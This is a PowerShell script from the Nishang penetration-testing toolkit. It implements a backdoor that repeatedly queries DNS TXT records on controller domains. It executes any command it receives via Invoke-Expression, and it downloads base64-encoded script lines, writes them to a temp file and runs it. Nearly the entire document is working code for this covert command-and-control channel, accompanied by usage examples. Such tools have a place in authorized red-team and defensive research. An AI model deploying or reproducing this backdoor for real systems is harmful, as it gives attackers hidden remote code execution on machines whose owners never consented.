<#
.SYNOPSIS
Nishang Payload which acts as a backdoor and is capable of 
recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This payload continuously queries a subdomain's TXT records. For
a response "startcommand" it queries another subdomain for command 
to execute. For a response "startps5" it queries a subdomain for 5 
lines of powershell script and then execute the script.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly
for further instructions.

.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands
to the payload.

.PARAMETER psdomain
The domain (or subdomain) which would be used to provide powershell scripts from 
its TXT records. This domain MUST contain subdomains for the number of lines of
your powershell script. If the script is 4 lines i.e. you use "startps4" as TXT
record of startdomain, psdomain must contain 1.psdomain, 2.psdomain and so on.
This way the query would be saved on the target and will be exeucted.

.EXAMPLE
PS > DNS_TXT_Pwnage start.alteredsecurity.com command.alteredsecurity.com alteredsecurity.com
In the aboce example if you want to execute commands. TXT record of start.alteredsecurity.com
must contain only "startcommand" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated 
record to execute new command.

To execute a script, start.alteredsecurity.com must contain startps<number>, where number 
is the line of powershell codes your script has. For example, if start.alteredsecurity.com
contains only "startps4", then this payload will query 1.alteredsecurity.com, 2.alteredsecurity.com
upto 4.alteredsecurity.com. Note that the payload expects each line of the powershell script
in TXT queries to be base64 encoded. Use the StringToBase64 script to encode scripts to base64.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $startdomain,
[Parameter(Position = 1, Mandatory = $True)] [String]$commanddomain,
[Parameter(Position = 2, Mandatory = $True)] [String]$psdomain )
#start.alteredsecurity.com
function DNS_TXT_Pwnage
{
while(1)
{
start-sleep -seconds 5
$getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
$tmp = $getcode | select-string -pattern "`""
$startcode = $tmp -split("`"")[0]
if ($startcode[1] -eq "startcommand")
{
start-sleep -seconds 5
$getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
$temp = $getcommand | select-string -pattern "`""
$command = $temp -split("`"")[0]
Invoke-Expression $command[1]
}
if ($startcode[1] -match "startps")
{
$len = ($startcode[1].length) - 1
$i = $startcode[1].substring($len)
$readstring = @()
for ($j=1; $j -le $i; $j++)
{

$getps = (Invoke-Expression "nslookup -querytype=txt $j.$psdomain") 
$tempps = $getps | select-string -pattern "`""
$tempps1 = $tempps -split("`"")[0]
$psscript = $tempps1[1]
$readstring  = [System.Convert]::FromBase64String($psscript)
$decodedstring = $decodedstring + "`r`n" + [System.Text.Encoding]::UTF8.GetString($readstring)

}
Out-File -FilePath "$env:temp\dns_payload.ps1" -Force -InputObject "$decodedstring"
Invoke-Expression "$env:temp\dns_payload.ps1"
break
}
}
}

DNS_TXT_Pwnage